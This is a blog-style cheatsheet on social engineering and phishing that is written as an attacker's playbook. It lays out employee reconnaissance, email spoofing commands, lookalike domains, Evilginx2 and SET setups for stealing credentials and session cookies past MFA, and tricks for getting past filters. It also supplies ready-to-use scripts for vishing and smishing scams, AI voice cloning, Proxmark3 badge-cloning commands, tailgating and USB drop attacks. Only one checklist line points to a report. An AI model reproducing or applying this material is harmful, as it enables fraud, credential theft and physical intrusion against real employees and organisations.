                    <h1 class="blog-title">Social Engineering & Phishing Cheatsheet</h1>
                    <div class="blog-meta">
                        <div class="author">
                            <div class="author-avatar">H</div>
                            <span>hackherway</span>
                        </div>
                        <span>June 1, 2026</span>
                        <span>19 min read</span>
                    </div>
                </article>

                <div class="blog-content">
                    <p id="se-intro">
                        The best exploit is the one that walks through the front door wearing a lanyard and a fake smile. Firewalls don't stop people from being people. EDR doesn't flag an employee who genuinely believes the "IT Help Desk" needs their password to "fix the server." Social engineering is the art of exploiting trust, urgency, and the fundamental human desire to be helpful. It's also the most reliable attack vector because humans don't patch their brain firmware.
                    </p>

                    <h2 id="se-recon">Target Reconnaissance</h2>
                    <p>
                        Good social engineering requires homework. You need to know the org chart, the internal jargon, the names of the IT director's dogs, and which conference room has the broken projector. The more specific your pretext, the more believable you are.
                    </p>
                    <pre><code># === OSINT FOR SE ===
# LinkedIn — org chart, roles, recent hires/departures
# Search: "site:linkedin.com/in 'Target Company' 'IT'"
# Recent hires are easiest targets — they don't know procedures yet

# Company website — team photos, names, titles
# Check /about, /team, /careers pages

# Glassdoor — employee complaints reveal internal tools
# "We use terrible VPN software" = know what to impersonate

# Job postings — reveal technology stack
# "Experience with Okta, Duo, CrowdStrike" = know the security stack

# Social media — personal details for rapport building
# Twitter: "Just got a new MacBook at work!" = knows hardware
# Instagram: office photos with visible badge designs, whiteboards

# Conference materials — speakers, topics, attendees
# Download PDFs from past events for internal contact lists

# WHOIS / DNS — sometimes reveals admin contact emails

# === BUILDING A TARGET PROFILE ===
# Name, role, department, manager, tenure
# Technology they use (laptop, phone, MFA method)
# Communication style (formal vs casual)
# Pain points (slow VPN, password resets, software issues)
# Schedule (when are they busiest? most stressed?)</code></pre>

                    <h2 id="se-phish">Phishing</h2>
                    <p>
                        Phishing is email-based social engineering at scale. It's not about sending 10,000 generic emails anymore — it's about sending 10 perfectly crafted emails that look like they came from the CEO's actual Gmail account. The days of "Dear Valued Customer, click here for your prize" are over. Modern phishing is indistinguishable from legitimate communication because it *is* legitimate communication, just with a malicious payload attached.
                    </p>

                    <h3 id="se-craft">Crafting Emails</h3>
                    <pre><code># === EMAIL SPOOFING ===
# Check SPF/DMARC/DKIM with dig
dig TXT target.com | grep -i "spf\|dmarc\|dkim"

# If SPF is soft fail (~all) or missing, spoof freely
# If DMARC is p=none, spoofing won't be rejected

# Use swaks for testing
swaks --to victim@target.com --from ceo@target.com --server mail.target.com

# For authenticated sending, use compromised accounts
# Or set up a lookalike domain
target-corp.com instead of targetcorp.com
targetcorp-mail.com
target-corp-security.com

# === EMAIL CONTENT ===
# Subject lines that work:
# "Urgent: Invoice Payment Required"
# "Action Required: Password Expiration"
# "IT Security Alert: Unusual Login Activity"
# "Your package delivery failed"
# "Meeting rescheduled — new Zoom link"

# Body content:
# - Use real names of colleagues
# - Reference real projects or events
# - Mimic the company's actual email formatting
# - Include the company logo (scraped from website)
# - Create urgency without being suspicious

# === PAYLOAD DELIVERY ===
# Malicious attachments:
# - Office macros (still works in 2026, somehow)
# - PDF with embedded JavaScript
# - ISO/VHD files (bypasses Mark-of-the-Web in some cases)
# - LNK files that execute PowerShell
# - HTML smuggling (delivers payload via benign-looking HTML)

# Malicious links:
# - Shortened URLs (bit.ly, tinyurl)
# - Lookalike domains
# - Legitimate services abused (GitHub, Dropbox, OneDrive)
# - QR codes (bypasses URL filtering on mobile)

# === CREDENTIAL HARVESTING ===
# Clone a login page with Social-Engineer Toolkit (SET)
setoolkit
# Option 1: Social-Engineering Attacks
# Option 2: Website Attack Vectors
# Option 3: Credential Harvester Attack Method

# Or manually clone with httrack
httrack https://login.target.com -O cloned_site
# Modify form action to POST to your server

# Evilginx2 — advanced phishing framework
# Bypasses MFA by acting as a reverse proxy
# Captures session cookies, not just credentials
evilginx2
config domain yourphishdomain.com
config ip your.server.ip
phishlets hostname okta yourphishdomain.com
phishlets enable okta
lures create okta
lures get-url 1</code></pre>

                    <h3 id="se-evo">Evasion Techniques</h3>
                    <pre><code># === BYPASSING EMAIL FILTERS ===
# SPF/DKIM/DMARC alignment
# Use lookalike domains with proper DNS records
# Set up SPF, DKIM, DMARC on your domain

# Content filtering evasion
# - Obfuscate URLs: hxxps://legit-looking-domain[.]com
# - Use HTML entities: &#104;&#116;&#116;&#112;&#115; for "https"
# - Split URLs across lines with zero-width spaces
# - Use image-based links instead of text

# Attachment evasion
# - Password-protected ZIP (filters can't scan inside)
# - Polyglot files (valid as multiple formats)
# - DDE/COM objects in Office (no macros needed)
# - XLM macros (Excel 4.0, bypasses modern macro detection)

# Domain reputation
# - Age the domain (register weeks in advance)
# - Build reputation with benign emails first
# - Use legitimate services (AWS, Azure) for hosting

# === BYPASSING MFA ===
# Evilginx2 / Modlishka — real-time proxy phishing
# Captures session cookies after MFA completion

# Push notification fatigue
# Spam MFA prompts until user approves to stop the notifications

# SIM swapping
# Social engineer the mobile carrier to port victim's number

# QR code phishing
# User scans code, logs in on attacker-controlled device
# MFA completes, attacker has the session</code></pre>

                    <h2 id="se-pretext">Pretexting</h2>
                    <p>
                        Pretexting is creating a fabricated scenario to obtain information. You're not just asking for a password — you're the new IT contractor who needs VPN access to fix the Exchange server before the board meeting. The pretext gives you legitimacy, urgency, and a reason for the victim to help you.
                    </p>
                    <pre><code># === COMMON PRETEXTS ===
# IT Support
"Hi, this is Mike from IT. We're seeing unusual login attempts
 from your account. Can you confirm your current password so
 we can verify it's really you?"

# Vendor/Supplier
"This is Sarah from Microsoft support. Your Office 365 license
 is expiring today. I need to verify your admin credentials
 to process the renewal."

# Executive Urgency
"This is the CEO. I'm in a meeting and can't access the VPN.
 Can you reset my password and text it to me?"

# New Employee
"Hey, I'm the new hire in accounting. IT said you'd help me
 get set up. Can you share the WiFi password?"

# Security Alert
"This is the Security Operations Center. We've detected
 malware on your machine. Please download this remote
 support tool so we can clean it."

# === BUILDING CREDIBILITY ===
# - Use internal jargon and acronyms
# - Reference real people, projects, meetings
# - Mention specific dates and times
# - Create time pressure ("before the audit", "by end of day")
# - Offer to "escalate to management" if they hesitate
# - Be polite but firm — helpful people want to comply

# === VISHING (VOICE PHISHING) ===
# Spoof caller ID to match internal extensions
# Use voice changers or AI voice cloning
# Reference help desk tickets or case numbers
# "I'm calling about ticket #12345 regarding your VPN issue"

# Tools for vishing:
# SpoofCard, SpoofTel for caller ID spoofing
# ElevenLabs, Resemble AI for voice cloning
# Custom IVR systems for automated credential collection</code></pre>

                    <h2 id="se-vishing">Vishing & Smishing</h2>
                    <p>
                        Voice phishing (vishing) and SMS phishing (smishing) bypass email filters entirely. A phone call feels more personal and urgent than an email. An SMS arrives with a notification that demands immediate attention. Both exploit the fact that people trust their phones more than their inboxes.
                    </p>
                    <pre><code># === VISHING SETUP ===
# Caller ID spoofing
# Use SIP trunking services that allow custom CLI
# Or social engineer the carrier to enable spoofing

# IVR (Interactive Voice Response) phishing
# Set up a fake bank/IT helpdesk phone tree
# "Press 1 to reset your password"
# "Enter your employee ID followed by pound"
# Record the DTMF tones, decode to credentials

# AI voice cloning
# Train on 30 seconds of audio from:
#   - Voicemail greetings
#   - Conference call recordings
#   - YouTube videos
#   - Podcast appearances
# Tools: ElevenLabs, Coqui TTS, Real-Time Voice Cloning

# === SMISHING ===
# SMS content that works:
# "Your package delivery failed. Reschedule: [link]"
# "Bank Alert: Suspicious transaction. Verify: [link]"
# "Your Uber code is 1234. If this wasn't you, click [link]"
# "IT: Your password expires today. Update: [link]"

# SMS delivery services
# Twilio, Nexmo, Plivo — all have APIs
# Use burner SIMs for anonymity

# Shortened URLs in SMS
# bit.ly, tinyurl, or custom short domain
# Mobile users can't hover to preview URLs

# QR code smishing
# Send image with QR code
# "Scan to verify your account"
# Leads to credential harvesting page</code></pre>

                    <h2 id="se-physical">Physical Social Engineering</h2>
                    <p>
                        Sometimes the best phishing email is a confident walk through the front door. Physical security is the forgotten layer — cameras that nobody watches, badge readers that accept cloned cards, and security guards who haven't had a raise since 2019. If you look like you belong, you belong.
                    </p>
                    <pre><code># === TAILGATING ===
# Follow someone through a secure door
# Carry a large box — people hold doors for people with boxes
# Pretend to be on a phone call — distracted people don't question
# "Can you badge me in? I left mine at my desk"
# Works best during lunch rush or shift changes

# === BADGE CLONING ===
# Proxmark3 for RFID badge cloning
proxmark3> lf search
proxmark3> lf hid read
proxmark3> lf hid clone ID

# Cheap HID cloners work on 125kHz prox cards
# High-frequency (13.56MHz) requires more effort
# MIFARE Classic can be cracked with known keys

# === IMPERSONATION ===
# Dress the part:
# - IT contractor: polo shirt, lanyard, tool bag
# - Delivery driver: uniform (Amazon, UPS, FedEx)
# - Inspector: clipboard, hard hat, safety vest
# - Auditor: suit, briefcase, serious expression

# Props that add legitimacy:
# - Fake work orders or service tickets
# - Company-branded USB drives (with payload)
# - "Visitor" badges from other locations
# - Business cards with real employee names

# === DROP ATTACKS ===
# Leave malicious USB drives in parking lots
# Label them "Q4 Financials" or "Employee Salaries"
# 50% curiosity rate in most organizations

# HID attack (Human Interface Device)
# USB that acts as keyboard, types payload instantly
# Rubber Ducky, Bash Bunny, O.MG Cable
# Types faster than any human — payloads execute in seconds</code></pre>

                    <h2 id="se-tools">Tools & Frameworks</h2>
                    <pre><code># === PHISHING FRAMEWORKS ===
# GoPhish — open-source phishing framework
gophish
# Web UI for campaign management
# Email templates, landing pages, tracking

# Evilginx2 — advanced proxy phishing
evilginx2
# Bypasses MFA by capturing session cookies
# Supports Okta, Microsoft, Duo, and custom phishlets

# Modlishka — reverse proxy phishing
# Similar to Evilginx2, more lightweight

# King Phisher — GUI phishing campaign tool

# === EMAIL TOOLS ===
# Swaks — SMTP testing and spoofing
swaks --to victim@target.com --from ceo@target.com --header "Subject: Urgent" --body "Click here"

# SendEmail — simple command-line email
sendEmail -f attacker@domain.com -t victim@target.com -u "Invoice" -m "See attached" -a invoice.pdf

# EmailHarvester — scrape emails from websites

# === VISHING TOOLS ===
# SpoofCard, SpoofTel — caller ID spoofing
# Twilio, Nexmo — SMS/voice APIs
# Social-Engineer Toolkit (SET) — has vishing modules

# === PHYSICAL TOOLS ===
# Proxmark3 — RFID research and cloning
# Rubber Ducky / Bash Bunny — HID attacks
# O.MG Cable — malicious USB-C/Lightning cable
# LAN Turtle — covert network implant
# WiFi Pineapple — rogue access point</code></pre>

                    <h2 id="se-checklist">Quick Checklist</h2>
                    <ul>
                        <li>Research target organization thoroughly (LinkedIn, website, Glassdoor)</li>
                        <li>Identify key individuals and their roles</li>
                        <li>Check email security posture (SPF/DKIM/DMARC)</li>
                        <li>Register lookalike domain with proper DNS records</li>
                        <li>Craft email with specific, believable pretext</li>
                        <li>Use real names, projects, and internal references</li>
                        <li>Create urgency without raising suspicion</li>
                        <li>Test payload against common email filters</li>
                        <li>Set up credential harvesting page (SET or Evilginx2)</li>
                        <li>Plan follow-up emails for non-responders</li>
                        <li>For vishing: prepare caller ID spoof and voice script</li>
                        <li>For physical: plan entry route, disguise, and exit strategy</li>
                        <li>Have a cover story for every question you might face</li>
                        <li>Document everything for the report (and your lawyer)</li>
                    </ul>

                    <blockquote>
                        "The most expensive firewall in the world won't stop an employee from holding the door open for someone carrying a box of donuts. Security is a people problem with a technology budget."
                    </blockquote>
